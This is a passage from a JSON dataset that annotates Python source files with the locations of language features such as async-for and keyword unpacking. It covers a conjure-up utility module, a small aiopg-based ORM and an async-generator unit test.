            "file": "import asyncio\nimport codecs\nimport errno\nimport json\nimport logging\nimport os\nimport pty\nimport re\nimport shutil\nimport socket\nimport subprocess\nimport sys\nimport uuid\nfrom collections import Mapping\nfrom contextlib import contextmanager\nfrom functools import partial\nfrom itertools import chain\nfrom pathlib import Path\nfrom subprocess import PIPE, Popen, check_call, check_output\nimport aiofiles\nimport yaml\nfrom pkg_resources import parse_version\nfrom raven.processors import SanitizePasswordsProcessor\nfrom termcolor import cprint\nfrom conjureup import charm\nfrom conjureup.app_config import app\nfrom conjureup.bundle import Bundle\nfrom conjureup.models.metadata import SpellMetadata\nfrom conjureup.telemetry import track_event\n@contextmanager\ndef chdir(directory):\n    cur = os.getcwd()\n    try:\n        yield os.chdir(directory)\n    finally:\n        os.chdir(cur)\ndef run(cmd, **kwargs):\n    try:\n        from subprocess import run as _run\n        return _run(cmd, **kwargs)\n    except ImportError:\n        if 'check' in kwargs:\n            del kwargs['check']\n            return check_call(cmd, **kwargs)\n        else:\n            return check_output(cmd, **kwargs)\ndef run_script(path, stderr=PIPE, stdout=PIPE):\n    return run(path, shell=True, stderr=stderr, stdout=stdout, env=app.env)\ndef run_attach(cmd, output_cb=None):\n    stdoutmaster, stdoutslave = pty.openpty()\n    subproc = Popen(cmd, shell=True,\n                    stdout=stdoutslave,\n                    stderr=PIPE)\n    os.close(stdoutslave)\n    decoder = codecs.getincrementaldecoder('utf-8')()\n    def last_ten_lines(s):\n        chunk = s[-1500:]\n        lines = chunk.splitlines(True)\n        return ''.join(lines[-10:]).replace('\\r', '')\n    decoded_output = \"\"\n    try:\n        while subproc.poll() is None:\n            try:\n                b = os.read(stdoutmaster, 512)\n            except OSError as e:\n                if e.errno != errno.EIO:\n                    raise\n                break\n            else:\n                final = False\n                if not b:\n                    final = True\n                decoded_chars = decoder.decode(b, final)\n                if decoded_chars is None:\n                    continue\n                decoded_output += decoded_chars\n                if output_cb:\n                    ls = last_ten_lines(decoded_output)\n                    output_cb(ls)\n                if final:\n                    break\n    finally:\n        os.close(stdoutmaster)\n        if subproc.poll() is None:\n            subproc.kill()\n        subproc.wait()\n    errors = [l.decode('utf-8') for l in subproc.stderr.readlines()]\n    if output_cb:\n        output_cb(last_ten_lines(decoded_output))\n    errors = ''.join(errors)\n    if subproc.returncode == 0:\n        return decoded_output.strip()\n    else:\n        raise Exception(\"Problem running {0} \"\n                        \"{1}:{2}\".format(cmd,\n                                         subproc.returncode))\nasync def arun(cmd, input=None, check=False, env=None, encoding='utf8',\n               stdin=PIPE, stdout=PIPE, stderr=PIPE, cb_stdout=None,\n               cb_stderr=None, **kwargs):\n    env = dict(app.env, **(env or {}))\n    outf = None\n    errf = None\n    try:\n        if isinstance(stdout, str):\n            outf = await aiofiles.open(stdout, 'w')\n            stdout = PIPE\n        if isinstance(stderr, str):\n            errf = await aiofiles.open(stderr, 'w')\n            stderr = PIPE\n        proc = await asyncio.create_subprocess_exec(*cmd,\n                                                    stdin=stdin,\n                                                    stdout=stdout,\n                                                    stderr=stderr,\n                                                    env=env,\n                                                    **kwargs)\n        data = {}\n        async def tstream(source_name, sink, ui_cb):\n            source = getattr(proc, source_name)\n            while proc.returncode is None:\n                async for line in source:\n                    line = line.decode(encoding)\n                    if ui_cb:\n                        ui_cb(line)\n                    data.setdefault(source_name, []).append(line)\n                    if sink:\n                        await sink.write(line)\n                        await sink.flush()\n                await asyncio.sleep(0.01)\n        tasks = []\n        if input:\n            if isinstance(input, str):\n                input = input.encode(encoding)\n                tasks.append(proc._feed_stdin(input))\n        if proc.stdout:\n            tasks.append(tstream('stdout', outf, cb_stdout))\n        if proc.stderr:\n            tasks.append(tstream('stderr', errf, cb_stderr))\n        await asyncio.gather(*tasks)\n        await proc.wait()\n    finally:\n        if outf:\n            await outf.close()\n        if errf:\n            await errf.close()\n    stdout_data = ''.join(data.get('stdout', [])) if proc.stdout else None\n    stderr_data = ''.join(data.get('stderr', [])) if proc.stderr else None\n    if check and proc.returncode != 0:\n        raise subprocess.CalledProcessError(proc.returncode,\n                                            cmd, stdout_data, stderr_data)\n    return (proc.returncode, stdout_data, stderr_data)\ndef sentry_report(message=None, exc_info=None, tags=None, **kwargs):\n    app.loop.run_in_executor(None, partial(_sentry_report,\n                                           message, exc_info, tags, **kwargs))\ndef _sentry_report(message=None, exc_info=None, tags=None, **kwargs):\n    if app.no_report:\n        return\n    try:\n        default_tags = {\n            'spell': app.config.get('spell'),\n            'cloud_type': app.provider.cloud_type if app.provider else None,\n            'region': app.provider.region if app.provider else None,\n            'jaas': app.is_jaas,\n            'headless': app.headless,\n            'juju_version': juju_version()\n        }\n        if message is not None and exc_info is None:\n            event_type = 'raven.events.Message'\n            kwargs['message'] = message\n            if 'level' not in kwargs:\n                kwargs['level'] = logging.WARNING\n        else:\n            event_type = 'raven.events.Exception'\n            if exc_info is None or exc_info is True:\n                kwargs['exc_info'] = sys.exc_info()\n            else:\n                kwargs['exc_info'] = exc_info\n            if 'level' not in kwargs:\n                kwargs['level'] = logging.ERROR\n        kwargs['tags'] = dict(default_tags, **(tags or {}))\n        app.sentry.capture(event_type, **kwargs)\n    except Exception:\n        pass\nasync def can_sudo(password=None):\n    if not password and app.sudo_pass:\n        password = app.sudo_pass\n    if password:\n        opt = '-S'  \n        password = '{}\\n'.format(password).encode('utf8')\n    else:\n        opt = '-n'  \n    proc = await asyncio.create_subprocess_exec('sudo', opt, '/bin/true',\n                                                stdin=subprocess.PIPE,\n                                                stdout=subprocess.DEVNULL,\n                                                stderr=subprocess.DEVNULL)\n    if password:\n        await proc.communicate(password)\n    else:\n        await proc.wait()\n    return proc.returncode == 0\ndef juju_version():\n    cmd = run_script('{} version'.format(app.juju.bin_path))\n    if cmd.returncode == 0:\n        return parse_version(cmd.stdout.decode().strip())\n    else:\n        raise Exception(\"Could not determine Juju version.\")\ndef snap_version():\n    cmd = run_script('snap version')\n    if cmd.returncode == 0:\n        name_version_str = cmd.stdout.decode().splitlines()[0]\n        try:\n            name, version = name_version_str.split()\n            if '~' in version:\n                version, series = version.split('~')\n            return parse_version(version)\n        except:\n            raise Exception(\"Could not determine Snap version.\")\ndef send_msg(msg, label, color, attrs=['bold']):\n    if app.conjurefile['color'] == 'auto':\n        colorized = sys.__stdout__.isatty()\n    elif app.conjurefile['color'] == 'always':\n        colorized = True\n    else:\n        colorized = False\n    if app.conjurefile['debug']:\n        print(\"[{}] {}\".format(label, msg))\n    elif colorized:\n        cprint(\"[{}] \".format(label),\n               color,\n               attrs=attrs,\n               end=\"{}\\n\".format(msg), flush=True)\n    else:\n        print(\"[{}] {}\".format(label, msg), flush=True)\ndef info(msg):\n    send_msg(msg, 'info', 'green')\ndef error(msg):\n    send_msg(msg, 'error', 'red')\ndef warning(msg):\n    send_msg(msg, 'warning', 'yellow')\ndef install_home():\n    return os.path.expanduser(\"~\" + install_user())\ndef juju_path():\n    return os.getenv('JUJU_DATA',\n                     os.path.expanduser('~/.local/share/juju'))\ndef mkdir(path):\n    if not os.path.isdir(path):\n        os.makedirs(path)\n        chown(path, install_user(), recursive=True)\ndef _normalize_bundle(original_bundle, overlay_bundle):\n    if 'applications' in original_bundle and 'services' in overlay_bundle:\n        overlay_bundle['applications'] = overlay_bundle.pop('services')\n    if 'services' in original_bundle and 'applications' in overlay_bundle:\n        overlay_bundle['services'] = overlay_bundle.pop('applications')\ndef merge_dicts(*dicts):\n    updated = {}\n    keys = set()\n    for d in dicts:\n        keys = keys.union(set(d))\n    for key in keys:\n        values = [d[key] for d in dicts if key in d]\n        maps = [value for value in values if isinstance(value, Mapping)]\n        lists = [value for value in values if isinstance(value, (list, tuple))]\n        if maps:\n            updated[key] = merge_dicts(*maps)\n        elif lists:\n            for i in range(len(values)):\n                if not isinstance(values[i], (list, tuple)):\n                    values[i] = [values[i]]\n            updated[key] = list(chain.from_iterable(values))\n        else:\n            updated[key] = values[-1]\n    return updated\ndef subtract_dicts(*dicts):\n    result = merge_dicts(dicts[0], {})  \n    for d in dicts[1:]:\n        for key, value in d.items():\n            if key not in result:\n                continue\n            if isinstance(value, Mapping):\n                result[key] = subtract_dicts(result[key], value)\n                if not result[key]:\n                    del result[key]\n            elif isinstance(value, (list, tuple)):\n                if not isinstance(result[key], (list, tuple)):\n                    if result[key] in value:\n                        del result[key]\n                else:\n                    result[key] = [item\n                                   for item in result[key]\n                                   if item not in value]\n                    if not result[key]:\n                        del result[key]\n            else:\n                del result[key]\n    return result\ndef chown(path, user, group=None, recursive=False):\n    if group is None:\n        group = user\n    try:\n        if not recursive or os.path.isfile(path):\n            shutil.chown(path, user, group)\n        else:\n            for root, dirs, files in os.walk(path):\n                shutil.chown(root, user, group)\n                for item in dirs:\n                    shutil.chown(os.path.join(root, item), user, group)\n                for item in files:\n                    shutil.chown(os.path.join(root, item), user, group)\n    except OSError as e:\n        raise e\ndef spew(path, data, owner=None):\n    with open(path, 'w') as f:\n        f.write(data)\n    if owner:\n        try:\n            chown(path, owner)\n        except:\n            raise Exception(\n                \"Unable to set ownership of {}\".format(path))\ndef slurp(path):\n    try:\n        with path.open() as f:\n            return f.read().strip()\n    except IOError:\n        raise IOError\ndef install_user():\n    user = os.getenv('USER', None)\n    if user is None:\n        raise Exception(\"Unable to determine current user.\")\n    return user\ndef setup_metadata_controller():\n    spell_dir = Path(app.config['spell-dir'])\n    bundle_filename = spell_dir / 'bundle.yaml'\n    bundle_custom_filename = spell_dir / 'bundle-custom.yaml'\n    if bundle_filename.exists():\n        bundle_data = Bundle(yaml.load(bundle_filename.read_text()))\n    else:\n        bundle_name = app.metadata.bundle_name\n        if bundle_name is None:\n            raise Exception(\n                \"Could not determine a bundle to download, please make sure \"\n                \"the spell contains a 'bundle-name' field.\"\n            )\n        bundle_channel = app.conjurefile['channel']\n        app.log.debug(\"Pulling bundle for {} from channel: {}\".format(\n            bundle_name, bundle_channel))\n        bundle_data = Bundle(charm.get_bundle(bundle_name, bundle_channel))\n    if bundle_custom_filename.exists():\n        bundle_custom = yaml.load(slurp(bundle_custom_filename))\n        bundle_data.apply(bundle_custom)\n    for name in app.selected_addons:\n        addon = app.addons[name]\n        bundle_data.apply(addon.bundle)\n    steps = list(chain(app.steps,\n                       chain.from_iterable(app.addons[addon].steps\n                                           for addon in app.selected_addons)))\n    for step in steps:\n        if not (step.bundle_add or step.bundle_remove):\n            continue\n        if step.bundle_remove:\n            fragment = yaml.safe_load(step.bundle_remove.read_text())\n            bundle_data.subtract(fragment)\n        if step.bundle_add:\n            fragment = yaml.safe_load(step.bundle_add.read_text())\n            bundle_data.apply(fragment)\n    if app.conjurefile['bundle-remove']:\n        fragment = yaml.safe_load(app.conjurefile['bundle-remove'].read_text())\n        bundle_data.subtract(fragment)\n    if app.conjurefile['bundle-add']:\n        fragment = yaml.safe_load(app.conjurefile['bundle-add'].read_text())\n        bundle_data.apply(fragment)\n    app.current_bundle = bundle_data\ndef set_chosen_spell(spell_name, spell_dir):\n    track_event(\"Spell Choice\", spell_name, \"\")\n    app.env['CONJURE_UP_SPELL'] = spell_name\n    app.config.update({'spell-dir': spell_dir,\n                       'spell': spell_name})\ndef set_spell_metadata():\n    app.metadata = SpellMetadata.load(\n        Path(app.config['spell-dir']) / 'metadata.yaml')\ndef get_spell_metadata(spell):\n    metadata_path = Path(app.config['spells-dir']) / spell / 'metadata.yaml'\n    return SpellMetadata.load(metadata_path)\ndef __available_on_darwin(key):\n    metadata = get_spell_metadata(key)\n    if is_darwin() and metadata.cloud_whitelist \\\n       and 'localhost' in metadata.cloud_whitelist:\n        return False\n    return True\ndef find_spells():\n    _spells = []\n    for category, cat_dict in app.spells_index.items():\n        for sd in cat_dict['spells']:\n            if not __available_on_darwin(sd['key']):\n                continue\n            _spells.append((category, sd))\n    return _spells\ndef find_addons_matching(key):\n    if key in app.addons_aliases:\n        return app.addons_aliases[key]\n    return {}\ndef find_spells_matching(key):\n    if key in app.spells_index:\n        _spells = []\n        for sd in app.spells_index[key]['spells']:\n            if not __available_on_darwin(sd['key']):\n                continue\n            _spells.append((key, sd))\n        return _spells\n    for category, d in app.spells_index.items():\n        for spell in d['spells']:\n            if spell['key'] == key:\n                if not __available_on_darwin(spell['key']):\n                    continue\n                return [(category, spell)]\n    return []\ndef get_options_whitelist(service_name):\n    metadata = app.metadata\n    if metadata is None:\n        return []\n    options_whitelist = metadata.options_whitelist\n    if options_whitelist is None:\n        return []\n    svc_opts_whitelist = options_whitelist.get(service_name, [])\n    return svc_opts_whitelist\ndef gen_hash():\n    return str(uuid.uuid4()).split('-')[0][:3]\ndef gen_model():\n    name = \"conjure-{}\".format(app.env['CONJURE_UP_SPELL'])\n    return \"{}-{}\".format(name[:24], gen_hash())\ndef gen_cloud():\n    name = \"cloud-{}\".format(app.provider.cloud_type)\n    return \"{}-{}\".format(name[:24], gen_hash())\ndef is_darwin():\n    return sys.platform.startswith('darwin')\ndef is_linux():\n    return sys.platform.startswith('linux')\ndef is_valid_hostname(hostname):\n    if len(hostname) > 255:\n        return False\n    if hostname[-1] == \".\":\n        hostname = hostname[:-1]\n    allowed = re.compile(\"(?!-)[A-Z\\d\\-\\_]{1,63}(?<!-)$\", re.IGNORECASE)\n    return all(allowed.match(x) for x in hostname.split(\".\"))\ndef set_terminal_title(title):\n    sys.stdout.write(\"\\x1b]2;{}\\x07\".format(title))\ndef get_physical_network_interfaces():\n    sys_class_net = Path('/sys/class/net')\n    devices = []\n    for device in sys_class_net.glob(\"*\"):\n        parts = str(device.resolve()).split('/')\n        if \"virtual\" in parts and not parts[-1].startswith('eth'):\n            continue\n        try:\n            if not get_physical_network_ipaddr(device.name):\n                continue\n        except Exception:\n            continue\n        devices.append(device.name)\n    if len(devices) == 0:\n        raise Exception(\n            \"Could not find a suitable physical network interface \"\n            \"to create a LXD bridge on. Please check your network \"\n            \"configuration.\")\n    return sorted(devices)\ndef get_physical_network_ipaddr(iface):\n    out = run_script('ip addr show {}'.format(iface))\n    if out.returncode != 0:\n        raise Exception(\n            \"Could not determine an IPv4 address for {}\".format(iface))\n    app.log.debug(\"Parsing {} for IPv4 address\".format(\n        out.stdout.decode('utf8')))\n    try:\n        ipv4_addr = out.stdout.decode(\n            'utf8').split('inet ')[1].split('/')[0]\n    except IndexError:\n        return None\n    return ipv4_addr\ndef get_open_port():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind((\"\", 0))\n    s.listen(1)\n    port = s.getsockname()[1]\n    s.close()\n    return port\nclass IterQueue(asyncio.Queue):\n    def __init__(self, *args, **kwargs):\n        self.sentinal = []\n        super().__init__(*args, **kwargs)\n    def __aiter__(self):\n        return self\n    async def __anext__(self):\n        item = await self.get()\n        if item is self.sentinal:\n            raise StopAsyncIteration\n        return item\n    async def close(self):\n        await self.put(self.sentinal)\nclass SanitizeDataProcessor(SanitizePasswordsProcessor):\n    def sanitize(self, key, value):\n        value = super().sanitize(key, value)\n        if value is None:\n            return value\n        def _check_str(s):\n            sl = s.lower()\n            for field in self.FIELDS:\n                if field not in sl:\n                    continue\n                if 'invalid' in s or 'error' in s:\n                    return '***(contains invalid {})***'.format(field)\n                else:\n                    return '***(contains {})***'.format(field)\n            return s\n        if isinstance(value, str):\n            value = _check_str(value)\n        elif isinstance(value, bytes):\n            value = _check_str(value.decode('utf8', 'replace'))\n        elif isinstance(value, (list, tuple, set)):\n            orig_type = type(value)\n            value = list(value)\n            for i, item in enumerate(value):\n                value[i] = self.sanitize(key, item)\n            value = orig_type(value)\n        elif isinstance(value, dict):\n            for key, value in value.items():\n                value[key] = self.sanitize(key, value)\n        else:\n            value_json = json.dumps(value)\n            sanitized = _check_str(value_json)\n            if sanitized != value_json:\n                value = sanitized\n        return value\nclass TestError(Exception):\n    def __init__(self):\n        super().__init__('This is a dummy error for testing reporting')\nclass SudoError(Exception):\n    pass\nclass UtilsHTTPError(Exception):\n    pass",
            "patterns": {
                "pep_468": [
                    [
                        40,
                        "_run(cmd, **kwargs)"
                    ],
                    [
                        44,
                        "check_call(cmd, **kwargs)"
                    ],
                    [
                        46,
                        "check_output(cmd, **kwargs)"
                    ],
                    [
                        110,
                        "asyncio.create_subprocess_exec(*cmd,\n                                                    stdin=stdin,\n                                                    stdout=stdout,\n                                                    stderr=stderr,\n                                                    env=env,\n                                                    **kwargs)"
                    ],
                    [
                        152,
                        "partial(_sentry_report,\n                                           message, exc_info, tags, **kwargs)"
                    ],
                    [
                        180,
                        "app.sentry.capture(event_type, **kwargs)"
                    ],
                    [
                        488,
                        "super().__init__(*args, **kwargs)"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        120,
                        127,
                        "async for",
                        "async for line in source:\n                    line = line.decode(encoding)\n                    if ui_cb:\n                        ui_cb(line)\n                    data.setdefault(source_name, []).append(line)\n                    if sink:\n                        await sink.write(line)\n                        await sink.flush()"
                    ]
                ],
                "pep_498v": [
                    [
                        428,
                        428,
                        ".format()"
                    ],
                    [
                        429,
                        429,
                        ".format()"
                    ],
                    [
                        431,
                        431,
                        ".format()"
                    ],
                    [
                        432,
                        432,
                        ".format()"
                    ],
                    [
                        201,
                        201,
                        ".format()"
                    ],
                    [
                        445,
                        445,
                        ".format()"
                    ],
                    [
                        466,
                        466,
                        ".format()"
                    ],
                    [
                        470,
                        471,
                        ".format()"
                    ],
                    [
                        94,
                        96,
                        ".format()"
                    ],
                    [
                        225,
                        225,
                        ".format()"
                    ],
                    [
                        344,
                        345,
                        ".format()"
                    ],
                    [
                        469,
                        469,
                        ".format()"
                    ],
                    [
                        188,
                        188,
                        ".format()"
                    ],
                    [
                        227,
                        227,
                        ".format()"
                    ],
                    [
                        232,
                        232,
                        ".format()"
                    ],
                    [
                        230,
                        230,
                        ".format()"
                    ],
                    [
                        318,
                        318,
                        ".format()"
                    ],
                    [
                        509,
                        509,
                        ".format()"
                    ],
                    [
                        511,
                        511,
                        ".format()"
                    ]
                ]
            }
        },
        "145": {
            "file": "__author__ = 'Michael Liao'\nimport asyncio, logging\nimport aiopg\ndef log(sql, args=()):\n    logging.info('SQL: %s' % sql)\n    logging.info('ARGS:')\n    logging.info(args)\nasync def create_pool(loop, **kw):\n    logging.info('create database connection pool...')\n    dsn = 'dbname=%s user=%s password=%s host=%s port=%s' %(kw['db'], kw['user'], kw['password'], kw['host'], kw.get('port', 5432))\n    global __pool\n    __pool = await aiopg.create_pool(dsn)\nasync def select(clss, sql, args, size=None):\n    log(sql, args)\n    global __pool\n    async with __pool.acquire() as conn:\n        async with conn.cursor() as cur:\n            await cur.execute(sql.replace('?', '%s'), args or ())\n            ret = []\n            async for row in cur:\n                ret.append(dict(zip(clss.__maplist__, row)))\n            if size:\n                rs = ret[:size]\n            else:\n                rs = ret\n        logging.info('rows returned: %s' % len(rs))\n        return rs\nasync def execute(sql, args, autocommit=True):\n    log(sql)\n    async with __pool.acquire() as conn:\n        if not autocommit:\n            await conn.begin()\n        try:\n            async with conn.cursor() as cur:\n                await cur.execute(sql.replace('?', '%s'), args)\n                affected = cur.rowcount\n            if not autocommit:\n                await conn.commit()\n        except BaseException as e:\n            if not autocommit:\n                await conn.rollback()\n            raise\n        return affected\ndef create_args_string(num):\n    L = []\n    for n in range(num):\n        L.append('?')\n    return ', '.join(L)\nclass Field(object):\n    def __init__(self, name, column_type, primary_key, default):\n        self.name = name\n        self.column_type = column_type\n        self.primary_key = primary_key\n        self.default = default\n    def __str__(self):\n        return '<%s, %s:%s>' % (self.__class__.__name__, self.column_type, self.name)\nclass StringField(Field):\n    def __init__(self, name=None, primary_key=False, default=None, ddl='varchar(100)'):\n        super().__init__(name, ddl, primary_key, default)\nclass BooleanField(Field):\n    def __init__(self, name=None, default=False):\n        super().__init__(name, 'boolean', False, default)\nclass IntegerField(Field):\n    def __init__(self, name=None, primary_key=False, default=0):\n        super().__init__(name, 'bigint', primary_key, default)\nclass FloatField(Field):\n    def __init__(self, name=None, primary_key=False, default=0.0):\n        super().__init__(name, 'real', primary_key, default)\nclass TextField(Field):\n    def __init__(self, name=None, default=None):\n        super().__init__(name, 'text', False, default)\nclass ModelMetaclass(type):\n    def __new__(cls, name, bases, attrs):\n        if name=='Model':\n            return type.__new__(cls, name, bases, attrs)\n        tableName = attrs.get('__table__', None) or name\n        logging.info('found model: %s (table: %s)' % (name, tableName))\n        mappings = dict()\n        fields = []\n        maplist = []\n        primaryKey = None\n        for k, v in attrs.items():\n            if isinstance(v, Field):\n                maplist.append(k)\n                logging.info('  found mapping: %s ==> %s' % (k, v))\n                mappings[k] = v\n                if v.primary_key:\n                    if primaryKey:\n                        raise StandardError('Duplicate primary key for field: %s' % k)\n                    primaryKey = k\n                else:\n                    fields.append(k)\n        if not primaryKey:\n            raise StandardError('Primary key not found.')\n        for k in mappings.keys():\n            attrs.pop(k)\n        escaped_fields = list(map(lambda f: '%s' % f, fields))\n        print('__maplist__:')\n        print(maplist)\n        attrs['__maplist__'] = maplist\n        attrs['__mappings__'] = mappings \n        attrs['__table__'] = tableName\n        attrs['__primary_key__'] = primaryKey \n        attrs['__fields__'] = fields \n        attrs['__select__'] = 'select %s, %s from %s' % (primaryKey, ', '.join(escaped_fields), tableName)\n        attrs['__insert__'] = 'insert into %s (%s, %s) values (%s)' % (tableName, ', '.join(escaped_fields), primaryKey, create_args_string(len(escaped_fields) + 1))\n        attrs['__update__'] = 'update %s set %s where %s=?' % (tableName, ', '.join(map(lambda f: '%s=?' % (mappings.get(f).name or f), fields)), primaryKey)\n        attrs['__delete__'] = 'delete from %s where %s=?' % (tableName, primaryKey)\n        return type.__new__(cls, name, bases, attrs)\nclass Model(dict, metaclass=ModelMetaclass):\n    def __init__(self, **kw):\n        super(Model, self).__init__(**kw)\n    def __getattr__(self, key):\n        try:\n            return self[key]\n        except KeyError:\n            raise AttributeError(r\"'Model' object has no attribute '%s'\" % key)\n    def __setattr__(self, key, value):\n        self[key] = value\n    def getValue(self, key):\n        return getattr(self, key, None)\n    def getValueOrDefault(self, key):\n        value = getattr(self, key, None)\n        if value is None:\n            field = self.__mappings__[key]\n            if field.default is not None:\n                value = field.default() if callable(field.default) else field.default\n                logging.debug('using default value for %s: %s' % (key, str(value)))\n                setattr(self, key, value)\n        return value\n    @classmethod\n    async def findAll(cls, where=None, args=None, **kw):\n        ' find objects by where clause. '\n        sql = [cls.__select__]\n        if where:\n            sql.append('where')\n            sql.append(where)\n        if args is None:\n            args = []\n        orderBy = kw.get('orderBy', None)\n        if orderBy:\n            sql.append('order by')\n            sql.append(orderBy)\n        limit = kw.get('limit', None)\n        if limit is not None:\n            if isinstance(limit, int):\n                sql.append('limit')\n                sql.append('?')\n                args.append(limit)\n            elif isinstance(limit, tuple) and len(limit) == 2:\n                sql.append('offset ? limit ?')\n                args.extend(limit)\n            else:\n                raise ValueError('Invalid limit value: %s' % str(limit))\n        rs = await select(cls, ' '.join(sql), args)\n        return [cls(**r) for r in rs]\n    @classmethod\n    async def findNumber(cls, selectField, where=None, args=None):\n        ' find number by select and where. '\n        sql = ['select %s _num_ from %s' % (selectField, cls.__table__)]\n        if where:\n            sql.append('where')\n            sql.append(where)\n        rs = await select(cls, ' '.join(sql), args, 1)\n        if len(rs) == 0:\n            return None\n        print(rs)\n        return rs[0]['id']\n    @classmethod\n    async def find(cls, pk):\n        ' find object by primary key. '\n        rs = await select(cls, '%s where %s=?' % (cls.__select__, cls.__primary_key__), [pk], 1)\n        if len(rs) == 0:\n            return None\n        return cls(**rs[0])\n    async def save(self):\n        args = list(map(self.getValueOrDefault, self.__fields__))\n        args.append(self.getValueOrDefault(self.__primary_key__))\n        rows = await execute(self.__insert__, args)\n        if rows != 1:\n            logging.warn('failed to insert record: affected rows: %s' % rows)\n    async def update(self):\n        args = list(map(self.getValue, self.__fields__))\n        args.append(self.getValue(self.__primary_key__))\n        rows = await execute(self.__update__, args)\n        if rows != 1:\n            logging.warn('failed to update by primary key: affected rows: %s' % rows)\n    async def remove(self):\n        args = [self.getValue(self.__primary_key__)]\n        rows = await execute(self.__delete__, args)\n        if rows != 1:\n            logging.warn('failed to remove by primary key: affected rows: %s' % rows)",
            "patterns": {
                "pep_468": [
                    [
                        112,
                        "super(Model, self).__init__(**kw)"
                    ],
                    [
                        156,
                        "cls(**r)"
                    ]
                ],
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio, logging"
                    ]
                ],
                "pep_562": [
                    [
                        113,
                        117,
                        "    def __getattr__(self, key):\n        try:\n            return self[key]\n        except KeyError:\n            raise AttributeError(r\"'Model' object has no attribute '%s'\" % key)",
                        "getattr"
                    ]
                ],
                "pep_525": [
                    [
                        20,
                        21,
                        "async for",
                        "async for row in cur:\n                ret.append(dict(zip(clss.__maplist__, row)))"
                    ]
                ],
                "pep_498v": [
                    [
                        10,
                        10,
                        "%"
                    ],
                    [
                        5,
                        5,
                        "%"
                    ],
                    [
                        56,
                        56,
                        "%"
                    ],
                    [
                        105,
                        105,
                        "%"
                    ],
                    [
                        106,
                        106,
                        "%"
                    ],
                    [
                        107,
                        107,
                        "%"
                    ],
                    [
                        108,
                        108,
                        "%"
                    ],
                    [
                        26,
                        26,
                        "%"
                    ],
                    [
                        77,
                        77,
                        "%"
                    ],
                    [
                        160,
                        160,
                        "%"
                    ],
                    [
                        172,
                        172,
                        "%"
                    ],
                    [
                        181,
                        181,
                        "%"
                    ],
                    [
                        187,
                        187,
                        "%"
                    ],
                    [
                        192,
                        192,
                        "%"
                    ],
                    [
                        85,
                        85,
                        "%"
                    ],
                    [
                        97,
                        97,
                        "%"
                    ],
                    [
                        117,
                        117,
                        "%"
                    ],
                    [
                        128,
                        128,
                        "%"
                    ],
                    [
                        154,
                        154,
                        "%"
                    ],
                    [
                        89,
                        89,
                        "%"
                    ],
                    [
                        107,
                        107,
                        "%"
                    ]
                ]
            }
        },
        "146": {
            "file": "import asyncio\nimport unittest\nimport asynctest\nfrom async_tools.context import aclosing\nclass MyTestCase(asynctest.TestCase, unittest.TestCase):\n    async def test_aclosing_async_iterator(self):\n        async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a\n        async with aclosing(async_iterator()) as g:\n            async for _ in g:\n                pass\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)\n    async def test_aclosing_async_iterator2(self):\n        async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a\n        async with aclosing(async_iterator()) as g:\n            self.assertEqual(await g.asend(None), 1)\n            self.assertEqual(await g.asend(None), 2)\n            self.assertEqual(await g.asend(None), 3)\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)\n    async def test_aclosing_async_generator(self):\n        async def async_generator():\n            await asyncio.sleep(0.01)\n            yield 10\n            yield 9\n        async with aclosing(async_generator()) as g:\n            self.assertEqual(await g.asend(None), 10)\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)\n    async def test_aclosing_async_generator2(self):\n        async def async_generator():\n            await asyncio.sleep(0.01)\n            try:\n                yield 10\n            finally:\n                yield 1000\n        with self.assertRaisesRegex(RuntimeError, \"ignored GeneratorExit\"):\n            async with aclosing(async_generator()) as g:\n                self.assertEqual(await g.asend(None), 10)\nif __name__ == \"__main__\":\n    unittest.main()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        6,
                        15,
                        "async generator",
                        "async def test_aclosing_async_iterator(self):\n        async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a\n        async with aclosing(async_iterator()) as g:\n            async for _ in g:\n                pass\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)"
                    ],
                    [
                        16,
                        26,
                        "async generator",
                        "async def test_aclosing_async_iterator2(self):\n        async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a\n        async with aclosing(async_iterator()) as g:\n            self.assertEqual(await g.asend(None), 1)\n            self.assertEqual(await g.asend(None), 2)\n            self.assertEqual(await g.asend(None), 3)\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)"
                    ],
                    [
                        27,
                        35,
                        "async generator",
                        "async def test_aclosing_async_generator(self):\n        async def async_generator():\n            await asyncio.sleep(0.01)\n            yield 10\n            yield 9\n        async with aclosing(async_generator()) as g:\n            self.assertEqual(await g.asend(None), 10)\n        with self.assertRaises(StopAsyncIteration):\n            await g.asend(None)"
                    ],
                    [
                        36,
                        45,
                        "async generator",
                        "async def test_aclosing_async_generator2(self):\n        async def async_generator():\n            await asyncio.sleep(0.01)\n            try:\n                yield 10\n            finally:\n                yield 1000\n        with self.assertRaisesRegex(RuntimeError, \"ignored GeneratorExit\"):\n            async with aclosing(async_generator()) as g:\n                self.assertEqual(await g.asend(None), 10)"
                    ],
                    [
                        7,
                        10,
                        "async generator",
                        "async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a"
                    ],
                    [
                        17,
                        20,
                        "async generator",
                        "async def async_iterator():\n            for a in range(1, 10):\n                await asyncio.sleep(0.01)\n                yield a"
                    ],
                    [
                        28,
                        31,
                        "async generator",
                        "async def async_generator():\n            await asyncio.sleep(0.01)\n            yield 10\n            yield 9"
                    ],
                    [
                        37,
                        42,
                        "async generator",
                        "async def async_generator():\n            await asyncio.sleep(0.01)\n            try:\n                yield 10\n            finally:\n                yield 1000"
                    ],
                    [
                        12,
                        13,
                        "async for",
                        "async for _ in g:\n                pass"
                    ]
                ]
            }
        },
        "147": {
